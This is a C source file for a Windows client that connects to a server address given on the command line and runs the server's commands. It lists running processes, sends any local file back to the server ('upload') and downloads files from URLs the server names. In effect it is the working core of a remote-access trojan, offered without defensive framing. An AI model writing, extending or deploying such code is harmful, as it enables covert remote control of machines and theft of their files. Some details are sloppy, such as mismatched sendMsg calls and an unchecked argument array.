#include "client.h"

int main(int argc, char* argv[]) {
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;

    int iResult;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed: %d\n", iResult);
        return 1;
    }

    struct addrinfo *result = NULL,
                    *ptr = NULL,
                    hints;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo(argv[1], DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    // Attempt to connect to an address until one succeeds
    int break_flag = 0;
    do {
        for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

            // Create a SOCKET for connecting to server
            ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
                ptr->ai_protocol);
            if (ConnectSocket == INVALID_SOCKET) {
                printf("socket failed with error: %ld\n", WSAGetLastError());
                WSACleanup();
                return 1;
            }

            // Connect to server.
            iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
            if (iResult == SOCKET_ERROR) {
                closesocket(ConnectSocket);
                ConnectSocket = INVALID_SOCKET;
                continue;
            } else {
                break_flag = 1;
            }
            break; //got a connection, or none worked
        }
    } while(!break_flag);

    if(!break_flag) return 1;
    printf("Connection established!\n");
    do {
        char recvbuf[DEFAULT_BUFLEN];
        char response[DEFAULT_BUFLEN];

        memset(recvbuf, 0, DEFAULT_BUFLEN);
        iResult = recvMsg(ConnectSocket, recvbuf);

        if (iResult > 0) {
            printf("Received: %s", recvbuf);
            iResult = parseCommand(ConnectSocket, recvbuf);
            if(iResult==0) {
                strcpy(response, "OK");
                sendMsg(ConnectSocket, response);
            } else if (iResult==1) {
                strcpy(response, "BAD COMMAND");
                sendMsg(ConnectSocket, response);
            } else if (iResult==2) {
                strcpy(response, "GOODBYE");
                sendMsg(ConnectSocket, response);
                iResult = shutdown(ConnectSocket, SD_SEND);
                if (iResult == SOCKET_ERROR) {
                    printf("shutdown failed: %d\n", WSAGetLastError());
                    closesocket(ConnectSocket);
                    WSACleanup();
                    return 1;
                }
                closesocket(ConnectSocket);
                WSACleanup();
                break;
            } else {
                return 1;
            }
        }
    } while(1);
}

int parseCommand(SOCKET sock, char* input) {
    char* strippedInput = strtok(input, "\n");

    char* token = strtok(strippedInput, CMD_DELIMITER);
    char* args[MAX_ARGS];

    int argCount = 0;
    while (token != NULL) {
        args[argCount++] = token;
        token = strtok(NULL, CMD_DELIMITER);
    }

    if (strcmp(args[0], "shutdown") == 0) {
        return cmdShutdown();
    } else if (strcmp(args[0], "inform") == 0) {
        return cmdInform(sock);
    } else if (strcmp(args[0], "proc") == 0) {
        return cmdProc(sock);
    } else if (strcmp(args[0], "upload") == 0) {
        if (argCount == 2) {
            return cmdUpload(sock, args[1]);
        } else {
            printf("Invalid arguments for upload command.\n");
            return 1;
        }
    } else if (strcmp(args[0], "download") == 0) {
        if (argCount == 3) {
            return cmdDownload(args[1], args[2]);
        } else {
            printf("Invalid arguments for download command.\n");
            return 1;
        }
    } else {
        printf("Invalid command.\n");
        return 1;
    }
}

int cmdShutdown() {
    printf("Executing shutdown\n");
    return 2;
}

int cmdInform(SOCKET sock) {
    printf("Executing inform\n");
    return 0;
}

int cmdProc(SOCKET sock) {
    DWORD processes[DEFAULT_BUFLEN];
    DWORD cbNeeded;

    char msg[DEFAULT_BUFLEN];
    memset(msg, 0, DEFAULT_BUFLEN);

    if (EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
        DWORD numProcesses = cbNeeded / sizeof(DWORD);
        for (DWORD i = 0; i < numProcesses; i++) {
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);
            if (hProcess != NULL) {
                TCHAR processName[MAX_PATH] = TEXT("<unknown>");
                char p[DEFAULT_BUFLEN];
                memset(p, 0, DEFAULT_BUFLEN);
                HMODULE hMod;
                if ( EnumProcessModules( hProcess, &hMod, sizeof(hMod), &cbNeeded) ) {
                    if (GetModuleBaseName(hProcess, hMod, processName, sizeof(processName) / sizeof(TCHAR))) {
                        printf("Process ID: %d, Process Name: %s\n", processes[i], processName);
                        sprintf(p, "Process ID: %d, Process Name: %s\n", processes[i], processName);

                        const char* cc = (const char*)p;

                        strncat(msg, cc, strlen(cc));
                    }
                    CloseHandle(hProcess);
                }   
            }
        }
        sendMsg(sock, msg);
    } else {
        return -1;
    }
    return 0;
}

int cmdUpload(SOCKET sock, char* filepath) {
    printf("Executing cmdUpload() with arg: %s\n", filepath);

    FILE* file = fopen(filepath, "r");
    if (!file) {
        printf("Failed to open file.");
        closesocket(sock);
        WSACleanup();
        return -1;
    }

    char buffer[DEFAULT_BUFLEN];
    int bytesRead = 0;
    int bytesSent;
    while ((bytesRead = fread(buffer, 1, DEFAULT_BUFLEN, file)) > 0) {
        bytesSent = sendMsg(sock, buffer, bytesRead);
        if (bytesSent == SOCKET_ERROR) {
            printf("Failed to send data. Error code: %d\n", WSAGetLastError());
            fclose(file);
            closesocket(sock);
            WSACleanup();
            return 1;
        }
    }

    fclose(file);

    return 0;
}

int cmdDownload(char* filename, char* cUrl) {
    printf("Executing cmdDownload() with args: %s, %s\n", filename, cUrl);

    HINTERNET hInternet, hUrl;
    DWORD bytesRead;
    char buffer[DEFAULT_BUFLEN];

    const char* path = filename;
    const char* url = cUrl;

    hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("Failed to initialize WinINet. Error code: %d\n", GetLastError());
        return -1;
    }

    hUrl = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hUrl == NULL) {
        printf("Failed to open URL. Error code: %d\n", GetLastError());
        InternetCloseHandle(hInternet);
        return 1;
    }

    HANDLE hFile = CreateFile(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Failed to create local file. Error code: %d\n", GetLastError());
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        return -1;
    }

    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        DWORD bytesWritten;
        if (!WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL) || bytesRead != bytesWritten) {
            printf("Failed to write data to local file. Error code: %d\n", GetLastError());
            CloseHandle(hFile);
            InternetCloseHandle(hUrl);
            InternetCloseHandle(hInternet);
            return -1;
        }
    }

    CloseHandle(hFile);

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    printf("File downloaded successfully.\n");

    return 0;

    return 0;
}